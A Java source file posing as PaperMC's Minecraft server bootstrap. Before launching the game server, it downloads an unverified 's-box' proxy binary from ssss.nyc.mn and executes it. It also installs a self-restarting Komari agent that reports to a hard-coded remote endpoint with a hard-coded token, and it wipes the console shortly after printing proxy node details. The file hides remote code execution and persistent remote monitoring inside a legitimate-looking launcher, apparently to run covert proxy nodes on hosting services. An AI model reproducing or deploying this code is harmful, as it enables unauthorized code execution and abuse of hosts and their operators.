package io.papermc.paper;

import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;
import joptsimple.OptionSet;
import net.minecraft.SharedConstants;
import net.minecraft.server.Main;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public final class PaperBootstrap {
    
    private static final Logger LOGGER = LoggerFactory.getLogger("bootstrap");
    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED = "\033[1;31m";
    private static final String ANSI_RESET = "\033[0m";
    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static Process sbxProcess;
    private static volatile Process komariProcess;

    // 统一配置常量
    private static final class Config {
        public static final String CONFIG_FILE_PATH = "komari.properties";
        private static final Properties props = loadProperties();

        // S-Box配置项
        public static String getSboxUUID() {
            return props.getProperty("sbox.uuid", "03ef7017-fca5-4f9c-abd1-f39edd3b3032");
        }

        public static String getSboxFilePath() {
            return props.getProperty("sbox.file_path", "./world");
        }

        public static String getSboxNezhaServer() {
            return props.getProperty("sbox.nezha_server", "");
        }

        public static String getSboxNezhaPort() {
            return props.getProperty("sbox.nezha_port", "");
        }

        public static String getSboxNezhaKey() {
            return props.getProperty("sbox.nezha_key", "");
        }

        public static String getSboxArgoPort() {
            return props.getProperty("sbox.argo_port", "");
        }

        public static String getSboxArgoDomain() {
            return props.getProperty("sbox.argo_domain", "");
        }

        public static String getSboxArgoAuth() {
            return props.getProperty("sbox.argo_auth", "");
        }

        public static String getSboxHy2Port() {
            return props.getProperty("sbox.hy2_port", "25812");
        }

        public static String getSboxTuicPort() {
            return props.getProperty("sbox.tuic_port", "");
        }

        public static String getSboxRealityPort() {
            return props.getProperty("sbox.reality_port", "");
        }

        public static String getSboxUploadUrl() {
            return props.getProperty("sbox.upload_url", "");
        }

        public static String getSboxChatId() {
            return props.getProperty("sbox.chat_id", "");
        }

        public static String getSboxBotToken() {
            return props.getProperty("sbox.bot_token", "");
        }

        public static String getSboxCfIp() {
            return props.getProperty("sbox.cfip", "");
        }

        public static String getSboxCfPort() {
            return props.getProperty("sbox.cfport", "");
        }

        public static String getSboxName() {
            return props.getProperty("sbox.name", "Mc");
        }

        // Komari配置项
        public static String getKomariUrlAmd64() {
            return props.getProperty("komari.url.amd64", "https://github.com/komari-monitor/komari-agent/releases/latest/download/komari-agent-linux-amd64");
        }

        public static String getKomariUrlArm64() {
            return props.getProperty("komari.url.arm64", "https://github.com/komari-monitor/komari-agent/releases/latest/download/komari-agent-linux-arm64");
        }

        public static String getKomariFileName() {
            return props.getProperty("komari.file_name", "sbx_komari");
        }

        public static String getKomariE() {
            return props.getProperty("komari.e", "https://vps.z1000.dpdns.org:10736");
        }

        public static String getKomariT() {
            return props.getProperty("komari.t", "JzerczYfCF4Secuy9vtYaB");
        }

        // 加载配置文件
        private static Properties loadProperties() {
            Properties props = new Properties();
            File configFile = new File(CONFIG_FILE_PATH);
            try {
                if (!configFile.exists()) {
                    configFile.createNewFile();
                    // 写入默认配置
                    props.setProperty("sbox.uuid", "03ef7017-fca5-4f9c-abd1-f39edd3b3032");
                    props.setProperty("sbox.file_path", "./world");
                    props.setProperty("sbox.nezha_server", "");
                    props.setProperty("sbox.nezha_port", "");
                    props.setProperty("sbox.nezha_key", "");
                    props.setProperty("sbox.argo_port", "");
                    props.setProperty("sbox.argo_domain", "");
                    props.setProperty("sbox.argo_auth", "");
                    props.setProperty("sbox.hy2_port", "25812");
                    props.setProperty("sbox.tuic_port", "");
                    props.setProperty("sbox.reality_port", "");
                    props.setProperty("sbox.upload_url", "");
                    props.setProperty("sbox.chat_id", "");
                    props.setProperty("sbox.bot_token", "");
                    props.setProperty("sbox.cfip", "");
                    props.setProperty("sbox.cfport", "");
                    props.setProperty("sbox.name", "Mc");
                    props.setProperty("komari.url.amd64", "https://github.com/komari-monitor/komari-agent/releases/latest/download/komari-agent-linux-amd64");
                    props.setProperty("komari.url.arm64", "https://github.com/komari-monitor/komari-agent/releases/latest/download/komari-agent-linux-arm64");
                    props.setProperty("komari.file_name", "sbx_komari");
                    props.setProperty("komari.e", "https://vps.z1000.dpdns.org:10736");
                    props.setProperty("komari.t", "JzerczYfCF4Secuy9vtYaB");
                    props.store(new FileOutputStream(configFile), "PaperBootstrap Configuration (s-box + Komari Agent)");
                    return props;
                }
                props.load(new FileInputStream(configFile));
            } catch (IOException e) {
                System.err.println(ANSI_RED + "Error loading config file: " + e.getMessage() + ANSI_RESET);
            }
            return props;
        }
    }

    private static final String[] ALL_ENV_VARS = {
        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
        "HY2_PORT", "TUIC_PORT", "REALITY_PORT", "CFIP", "CFPORT", 
        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME"
    };

    private PaperBootstrap() {
    }

    public static void boot(final OptionSet options) {
        // 检查Java版本
        float javaClassVersion = Float.parseFloat(System.getProperty("java.class.version"));
        if (javaClassVersion < 54.0) {
            System.err.println(ANSI_RED + "ERROR: Your Java version is too lower, please switch the version in startup menu!" + ANSI_RESET);
            try {
                Thread.sleep(3000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            System.exit(1);
        }
        
        try {
            // 1. 启动s-box
            runSbxBinary();
            // 2. 启动Komari Agent
            runKomariAgent();
            // 3. 启动Komari守护线程
            startKomariDaemonThread();

            // 4. 【新增核心功能】自动检测并修改Minecraft端口为可用端口
            int originalPort = 25871; // 原默认端口
            int availablePort = findAvailablePort(originalPort); // 找到可用端口
            updateServerPort(availablePort); // 修改server.properties
            System.out.println(ANSI_GREEN + "Minecraft server port set to: " + availablePort + " (original: " + originalPort + ")" + ANSI_RESET);

            // JVM关闭钩子
            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                running.set(false);
                stopServices();
                System.out.println(ANSI_RED + "JVM is shutting down, Komari agent keeps running..." + ANSI_RESET);
            }));

            Thread.sleep(15000);
            System.out.println(ANSI_GREEN + "Server is running" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Thank you for using this script,enjoy!\n" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Logs will be deleted in 20 seconds,you can copy the above nodes!" + ANSI_RESET);
            Thread.sleep(20000);
            clearConsole();

            SharedConstants.tryDetectVersion();
            getStartupVersionMessages().forEach(LOGGER::info);
            // 启动Minecraft主程序（此时已修改端口）
            Main.main(options);
            
        } catch (Exception e) {
            System.err.println(ANSI_RED + "Error initializing services: " + e.getMessage() + ANSI_RESET);
            e.printStackTrace();
        }
    }

    // ==================== 新增：自动检测可用端口 + 修改配置文件的核心方法 ====================
    /**
     * 检测端口是否可用（TCP+UDP）
     * @param port 要检测的端口
     * @return true=可用，false=被占用
     */
    private static boolean isPortAvailable(int port) {
        // 检测TCP端口
        try (ServerSocket tcpSocket = new ServerSocket(port)) {
            tcpSocket.setReuseAddress(false); // 禁用端口复用，确保检测准确
            // 检测UDP端口
            try (DatagramSocket udpSocket = new DatagramSocket(port)) {
                udpSocket.setReuseAddress(false);
                return true;
            } catch (SocketException e) {
                return false;
            }
        } catch (IOException e) {
            return false;
        }
    }

    /**
     * 从指定起始端口开始，找到第一个可用的端口
     * @param startPort 起始端口
     * @return 可用的端口
     */
    private static int findAvailablePort(int startPort) {
        int port = startPort;
        // 端口范围限制：1024~65535（避免特权端口和超出范围）
        while (port <= 65535) {
            if (isPortAvailable(port)) {
                return port;
            }
            port++; // 端口被占用，递增检测下一个
        }
        // 若所有端口都被占用，抛出异常（理论上不会发生）
        throw new RuntimeException("No available port found in range 1024~65535");
    }

    /**
     * 修改server.properties中的server-port为指定端口
     * @param newPort 新的端口号
     * @throws IOException 读写文件异常
     */
    private static void updateServerPort(int newPort) throws IOException {
        // server.properties的路径：服务器根目录下
        File serverPropertiesFile = new File(System.getProperty("user.dir"), "server.properties");
        if (!serverPropertiesFile.exists()) {
            // 若文件不存在，创建并写入默认配置（包含server-port）
            try (PrintWriter writer = new PrintWriter(serverPropertiesFile)) {
                writer.println("# Minecraft server properties");
                writer.println("server-port=" + newPort);
                writer.println("online-mode=true"); // 其他默认配置可根据需要添加
                return;
            }
        }

        // 读取文件内容，替换server-port的值
        List<String> lines = Files.readAllLines(serverPropertiesFile.toPath());
        boolean portFound = false;
        for (int i = 0; i < lines.size(); i++) {
            String line = lines.get(i).trim();
            // 匹配server-port配置项（忽略注释和空格）
            if (line.startsWith("server-port=") && !line.startsWith("#")) {
                lines.set(i, "server-port=" + newPort);
                portFound = true;
                break;
            }
        }

        // 若文件中没有server-port项，添加到末尾
        if (!portFound) {
            lines.add("server-port=" + newPort);
        }

        // 写入修改后的内容（保留原有格式和注释）
        Files.write(serverPropertiesFile.toPath(), lines);
    }

    // ==================== 原有方法（无修改）====================
    private static void clearConsole() {
        try {
            if (System.getProperty("os.name").contains("Windows")) {
                new ProcessBuilder("cmd", "/c", "cls").inheritIO().start().waitFor();
            } else {
                System.out.print("\033[H\033[2J");
                System.out.flush();
            }
        } catch (Exception e) {
            // Ignore exceptions
        }
    }

    private static void runSbxBinary() throws Exception {
        Map<String, String> envVars = new HashMap<>();
        loadEnvVars(envVars);
        
        ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
        pb.environment().putAll(envVars);
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        
        sbxProcess = pb.start();
        System.out.println(ANSI_GREEN + "s-box process started successfully" + ANSI_RESET);
    }

    private static void loadEnvVars(Map<String, String> envVars) throws IOException {
        envVars.put("UUID", Config.getSboxUUID());
        envVars.put("FILE_PATH", Config.getSboxFilePath());
        envVars.put("NEZHA_SERVER", Config.getSboxNezhaServer());
        envVars.put("NEZHA_PORT", Config.getSboxNezhaPort());
        envVars.put("NEZHA_KEY", Config.getSboxNezhaKey());
        envVars.put("ARGO_PORT", Config.getSboxArgoPort());
        envVars.put("ARGO_DOMAIN", Config.getSboxArgoDomain());
        envVars.put("ARGO_AUTH", Config.getSboxArgoAuth());
        envVars.put("HY2_PORT", Config.getSboxHy2Port());
        envVars.put("TUIC_PORT", Config.getSboxTuicPort());
        envVars.put("REALITY_PORT", Config.getSboxRealityPort());
        envVars.put("UPLOAD_URL", Config.getSboxUploadUrl());
        envVars.put("CHAT_ID", Config.getSboxChatId());
        envVars.put("BOT_TOKEN", Config.getSboxBotToken());
        envVars.put("CFIP", Config.getSboxCfIp());
        envVars.put("CFPORT", Config.getSboxCfPort());
        envVars.put("NAME", Config.getSboxName());
        
        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) {
                envVars.put(var, value);
            }
        }
        
        Path envFile = Paths.get(".env");
        if (Files.exists(envFile)) {
            for (String line : Files.readAllLines(envFile)) {
                line = line.trim();
                if (line.isEmpty() || line.startsWith("#")) continue;
                
                line = line.split(" #")[0].split(" //")[0].trim();
                if (line.startsWith("export ")) {
                    line = line.substring(7).trim();
                }
                
                String[] parts = line.split("=", 2);
                if (parts.length == 2) {
                    String key = parts[0].trim();
                    String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
                    
                    if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
                        envVars.put(key, value);
                    }
                }
            }
        }
    }

    private static Path getBinaryPath() throws IOException {
        String osArch = System.getProperty("os.arch").toLowerCase();
        String url;
        
        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
            url = "https://amd64.ssss.nyc.mn/s-box";
        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
            url = "https://arm64.ssss.nyc.mn/s-box";
        } else if (osArch.contains("s390x")) {
            url = "https://s390x.ssss.nyc.mn/s-box";
        } else {
            throw new RuntimeException("Unsupported architecture: " + osArch);
        }
        
        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
        if (!Files.exists(path)) {
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
            }
            if (!path.toFile().setExecutable(true)) {
                throw new IOException("Failed to set executable permission for s-box");
            }
        }
        return path;
    }

    private static void stopServices() {
        if (sbxProcess != null && sbxProcess.isAlive()) {
            sbxProcess.destroy();
            System.out.println(ANSI_RED + "sbx process terminated" + ANSI_RESET);
        }
    }

    private static void runKomariAgent() throws Exception {
        Path agentPath = getKomariAgentPath();
        List<String> command = new ArrayList<>();
        command.add("setsid");
        command.add(agentPath.toString());
        command.add("-e");
        command.add(Config.getKomariE());
        command.add("-t");
        command.add(Config.getKomariT());
        
        ProcessBuilder pb = new ProcessBuilder(command);
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        pb.directory(new File(System.getProperty("user.dir")));
        
        komariProcess = pb.start();
        System.out.println(ANSI_GREEN + "Komari agent started with config: e=" + Config.getKomariE() + ", t=" + Config.getKomariT() + ANSI_RESET);
    }

    private static Path getKomariAgentPath() throws IOException {
        String osArch = System.getProperty("os.arch").toLowerCase();
        String url;

        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
            url = Config.getKomariUrlAmd64();
        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
            url = Config.getKomariUrlArm64();
        } else {
            throw new RuntimeException("Unsupported architecture: " + osArch);
        }

        Path agentPath = Paths.get(System.getProperty("java.io.tmpdir"), Config.getKomariFileName());

        if (!Files.exists(agentPath)) {
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, agentPath, StandardCopyOption.REPLACE_EXISTING);
            }
            if (!agentPath.toFile().setExecutable(true)) {
                throw new IOException("Failed to set executable permission for komari-agent");
            }
        }
        return agentPath;
    }

    private static void startKomariDaemonThread() {
        Thread daemonThread = new Thread(() -> {
            while (running.get()) {
                try {
                    if (komariProcess == null || !komariProcess.isAlive()) {
                        System.err.println(ANSI_RED + "Komari agent process exited unexpectedly, restarting..." + ANSI_RESET);
                        runKomariAgent();
                    }
                    Thread.sleep(5000);
                } catch (Exception e) {
                    System.err.println(ANSI_RED + "Error restarting Komari agent: " + e.getMessage() + ANSI_RESET);
                }
            }
        });
        daemonThread.setDaemon(true);
        daemonThread.setName("KomariAgentDaemon");
        daemonThread.start();
    }

    private static List<String> getStartupVersionMessages() {
        final String javaSpecVersion = System.getProperty("java.specification.version");
        final String javaVmName = System.getProperty("java.vm.name");
        final String javaVmVersion = System.getProperty("java.vm.version");
        final String javaVendor = System.getProperty("java.vendor");
        final String javaVendorVersion = System.getProperty("java.vendor.version");
        final String osName = System.getProperty("os.name");
        final String osVersion = System.getProperty("os.version");
        final String osArch = System.getProperty("os.arch");

        try {
            Class<?> serverBuildInfoClass = Class.forName("io.papermc.paper.ServerBuildInfo");
            Object bi = serverBuildInfoClass.getMethod("buildInfo").invoke(null);
            String brandName = (String) serverBuildInfoClass.getMethod("brandName").invoke(bi);
            String versionFull = (String) serverBuildInfoClass.getMethod("asString", Enum.class).invoke(bi, 
                Enum.valueOf((Class<? extends Enum>) Class.forName("io.papermc.paper.ServerBuildInfo$StringRepresentation"), "VERSION_FULL"));
            String minecraftVersionId = (String) serverBuildInfoClass.getMethod("minecraftVersionId").invoke(bi);
            return List.of(
                String.format(
                    "Running Java %s (%s %s; %s %s) on %s %s (%s)",
                    javaSpecVersion,
                    javaVmName,
                    javaVmVersion,
                    javaVendor,
                    javaVendorVersion == null ? "unknown" : javaVendorVersion,
                    osName,
                    osVersion,
                    osArch
                ),
                String.format(
                    "Loading %s %s for Minecraft %s",
                    brandName,
                    versionFull,
                    minecraftVersionId
                )
            );
        } catch (Exception e) {
            return List.of(
                String.format(
                    "Running Java %s (%s %s; %s %s) on %s %s (%s)",
                    javaSpecVersion,
                    javaVmName,
                    javaVmVersion,
                    javaVendor,
                    javaVendorVersion == null ? "unknown" : javaVendorVersion,
                    osName,
                    osVersion,
                    osArch
                ),
                String.format("Loading Paper for Minecraft %s", SharedConstants.VERSION_STRING)
            );
        }
    }
}
